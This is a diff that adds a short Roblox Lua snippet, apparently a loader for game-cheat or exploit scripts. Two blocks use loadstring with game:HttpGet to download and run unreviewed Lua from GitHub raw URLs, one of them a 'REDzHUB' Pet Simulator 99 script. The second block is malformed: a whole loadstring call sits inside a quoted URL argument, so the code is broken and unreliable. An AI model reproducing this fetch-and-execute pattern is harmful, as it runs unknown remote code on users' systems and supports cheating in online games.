@@ -1,0 +1,6 @@
+task.spawn(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/shuutys/main/main/script.lua"))()
+        end)
+task.spawn(function()
+    loadstring(game:HttpGet("loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/PetSimulator99/main/redz9999.lua"))()", true))()
+        end)
